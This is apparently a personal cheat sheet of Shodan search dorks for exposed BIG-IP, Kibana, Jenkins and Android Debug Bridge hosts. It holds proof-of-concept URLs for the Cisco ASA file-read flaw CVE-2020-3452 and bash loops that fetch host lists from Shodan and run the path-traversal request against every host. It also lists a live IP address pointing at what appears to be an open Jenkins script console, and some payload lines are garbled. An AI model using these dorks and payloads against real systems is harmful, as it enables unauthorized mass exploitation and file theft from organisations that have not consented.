```markdown
###
```bash
http.favicon.hash:-335242539 "3992" -BIGIP
```

RCE prompt for shodan.io
### kibana content-lenght:217

---

### '''File read vuln +CSCOE+, CISCO ASA'''  search on shodan.io

Here is POC of CVE-2020-3452, unauthenticated file read in Cisco ASA & Cisco Firepower.

For example to read "/+CSCOE+/portal_inc.lua" file.

[POC #1] 
``` (https://<domain>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../) ```

[POC #2]
```(https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua) ```

---
---

### Shodan

```bash
shodan search Cisco ASA --fields ip_str --separator " " | awk '{print $1}'
```

```bash
while read host; do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSC0E%2b/portal_inc.lua&default-language&lang=…/"; done < <(cat microsoftvpn.json | awk '{print $1}')
```

```bash
cat microsoftvpn.json | awk '{print $1}' | while read host; do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSC0E%2b/portal_inc.lua&default-language&lang=../"; done
```

---

### html:"Dashboard Jenkins" http.component:"jenkins" put on -SHODAN 

[Reference](https://medium.com/@awezkagdi.ak/remote-code-execution-a-story-of-simple-rce-on-jenkins-instance-4f01ea098269)

---

### "Andorid Debug Bridge" "Device" port:5555   

---

### "X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard" 200 OK put on shodan

[Script] ```(https://34.93.208.164/script) ```


